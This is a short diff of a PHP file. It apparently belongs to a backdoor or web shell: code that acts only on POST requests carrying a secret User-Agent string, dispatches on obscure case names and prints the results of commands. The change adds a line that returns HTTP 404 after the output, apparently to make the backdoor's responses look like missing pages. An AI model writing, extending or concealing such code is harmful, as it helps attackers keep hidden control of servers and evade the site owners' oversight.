@@ -356,6 +356,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
                         $r = "\033[0;36m{$isenabled}\033[0m";
                     }
                     echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $commands, trim($r));
+                    http_response_code(404);
                 }
                 break;
             case "cqI":
